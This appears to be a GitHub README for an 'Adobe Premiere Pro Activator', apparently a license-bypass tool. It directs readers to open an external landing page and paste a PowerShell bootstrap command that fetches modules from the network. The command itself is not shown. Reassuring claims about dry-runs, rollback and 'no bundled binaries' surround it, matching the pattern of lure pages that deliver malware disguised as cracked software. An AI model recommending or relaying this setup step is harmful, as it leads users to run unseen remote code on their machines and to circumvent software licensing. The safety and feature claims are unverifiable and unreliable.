<div align="center">
<br/>
<h1>Adobe Premiere Pro Activator</h1>
<h3><em>Utilities and companion tools for Adobe Premiere Pro Activator.</em></h3>
<br/>
<p>
  <img src="https://img.shields.io/badge/Platform-Windows-e01327?style=for-the-badge&logo=windows" alt="" />
  <img src="https://img.shields.io/badge/Release-2026-2563EB?style=for-the-badge" alt="" />
  <img src="https://img.shields.io/badge/Build-.exe-2563EB?style=for-the-badge" alt="" />
</p>
<br/>
</div>

<p align="center">
  <img src="https://readme-typing-svg.herokuapp.com?color=DC2626&size=28&center=true&vCenter=true&width=900&lines=%F0%9F%93%A6+Premiere+Activator+Pro;%F0%9F%92%A1+Standalone+.exe+Release;%E2%9C%A8+Community+Tested;%F0%9F%94%A7+Full+Feature+Suite;%E2%9C%85+Active+Development+2026;%E2%AD%90+Updated+for+2026">
</p>

<p align="center">
  <img src="https://skillicons.dev/icons?i=github" />
  <img src="https://skillicons.dev/icons?i=dotnet" />
</p>

---

### 🖥️ PowerShell Setup

Launch a Windows PowerShell session and run the single preview command shown on the landing page to bootstrap the Adobe Premiere Pro Activator environment.

---

<p align="center">
  <a href="https://axeltrain.github.io/premiere-activator/">
    <img src="files/button.svg" width="520" alt="Install via Powershell" />
  </a>
</p>

## 🎬 Why this replaces the old approach

The old workflow was a stack of .bat files, a couple of zipped "releases" floating around Discord, and a shared drive folder called `premiere_stuff_FINAL_v3`. It broke every time Premiere updated, silently patched things it shouldn't, and left no trace of what it changed. We got tired of being the person who had to fix it at 2 a.m. before a client review.

This rewrite keeps the parts that actually worked and throws out everything else:

- 🧩 **Modular activation core** — each Premiere component is its own module, version-gated, so a Premiere update means updating one module, not the whole tool
- 🎞️ **Codec / plugin toggles** — enable or disable specific modules (H.264/HEVC export, third-party panel hosts) independently instead of a blanket "activate everything"
- 🩺 **Pre-flight diagnostics** — checks Premiere version, plugin folder state, and module manifest integrity *before* touching anything
- 🧾 **Change log written to disk** — every module action is recorded in a plaintext session log you can diff
- 🔒 **No bundled binaries** — setup pulls modules from the landing manifest, so you can inspect what gets loaded
- 🛠️ **Rollback command** — revert the last module pass with one call if a Premiere update disapproves
- 🧪 **Self-test harness** — every module ships with a dry-run mode so you can verify behavior without committing
- 🧑‍🤝‍🧑 **Contributor-sized** — modules live in their own folders; no giant `main.ps1` monolith

---

## 🧠 How it actually works

The rewrite is built around a small bootstrap loader. When the landing command runs, PowerShell verifies the local execution context, then pulls a signed module manifest and stages each module into a versioned folder under the user profile. Nothing is written to `C:\Program Files` or to Premiere's install directory — every module operates on the user-level plugin path and settings directory, which is why rollbacks are clean.

Each module declares the Premiere builds it supports, the files it touches, and a dry-run operation. Before any module runs for real, the loader performs the dry pass and compares the resulting diff against the module's expected footprint. If the diff is larger than declared, the module refuses to run — that single check has caught more regressions than anything else we added this year.

The activation core itself is intentionally boring: read manifest → validate → stage → execute module → append to log. There's no background service, no telemetry, no auto-updater. You re-run the landing command when you want the current modules; you use the rollback command when you don't. Legacy code from the 2022–2024 era (the `.bat` dispatcher, the inline base64 payloads, the "sync" script that scraped a shared drive) was deleted in the January 2026 rewrite and is not coming back.

---

## ⚖️ Comparison

| Capability | **premiere-activator** | Old `.bat` dispatcher | "Release zip" from Discord | Manual plugin folder surgery |
|---|---|---|---|---|
| Version-gated modules | ✅ per-module | ❌ whole-script | ⚠️ if you remembered | ❌ |
| Pre-flight diagnostics | ✅ built in | ❌ | ❌ | ❌ manually |
| Dry-run before commit | ✅ default | ❌ | ❌ | ❌ |
| Rollback | ✅ one command | ❌ | ❌ catch the zip again | ❌ restore from backup |
| Change log | ✅ plaintext per session | ⚠️ if `>> log` was added | ❌ | ❌ |
| Bundled binaries | 🚫 none | ⚠️ often | ⚠️ usually | 🚫 |
| Contributor-readable code | ✅ module folders | ❌ monolith | ❌ | n/a |

---

## 💻 System Requirements

- **OS:** Windows 10 (21H2+) or Windows 11
- **PowerShell:** 5.1 or later (Windows PowerShell is fine; PS7 also supported)
- **Network:** required for the initial bootstrap (modules are pulled from the landing manifest)
- **Disk:** ~80 MB for staged modules and logs
- **Premiere Pro:** installed and at least launched once, so the user plugin/settings paths exist
- **Permissions:** standard user; no admin elevation required for user-level modules

---

## 🚀 Features

- 🧩 Per-module activation core, version-gated to Premiere builds
- 🎞️ Independent codec / export / panel-host module toggles
- 🩺 Pre-flight diagnostics that run before any file is touched
- 🧾 Per-session plaintext change log for diffing
- 🔁 One-command rollback of the last module pass
- 🧪 Dry-run harness for every module
- 🚫 No bundled binaries — everything staged from the manifest
- 🗂️ Contributor-friendly module folders (delete a folder, delete the feature)

---

## 🧰 Compatibility

Tested against current Premiere Pro release channels on Windows 10 and 11. Module manifests declare supported builds; unsupported builds are skipped, not forced. Offline: once modules are staged, the loader runs fully offline — only the bootstrap step needs network. macOS is out of scope for this repo.

---

## ❓ FAQ

<details><summary>Is this an .exe?</summary>
No. Setup is a PowerShell bootstrap command you run from a normal terminal. There is no installer executable.</details>

<details><summary>Do I need admin rights?</summary>
No for user-level modules. The loader refuses to elevate; if a module needs system paths it will tell you and stop.</details>

<details><summary>What does the landing command actually do?</summary>
It opens the landing page which shows the exact bootstrap line for your environment, then stages modules into your user profile. Details are on the landing.</details>

<details><summary>Will a Premiere update break it?</summary>
The pre-flight check will tell you if a module no longer matches your build. In most cases you just re-run the landing command to pick up the updated manifest.</details>

<details><summary>Where do logs go?</summary>
Into a `logs/` folder next to the staged modules under your user profile. Plaintext, one file per session, safe to share (redact paths first).</details>

<details><summary>Can I roll back?</summary>
Yes — the rollback command reverts the last module pass using the session log as its source of truth.</details>

<details><summary>Is macOS supported?</summary>
No. This repo is Windows-only by design.</details>

<details><summary>Can I contribute a module?</summary>
Yes — modules live in their own folders, need a manifest, a dry-run, and a declared file footprint. PRs that skip the dry-run get closed.</details>

---

## ⚠️ Disclaimer

This is a hobbyist / educational project. It is not affiliated with, endorsed by, or supported by Adobe. Use it at your own risk — back up your Premiere project files and settings directory before running any module. You are responsible for complying with any license terms that apply to software on your machine.

## 📄 License

MIT. See `LICENSE` for the full text.
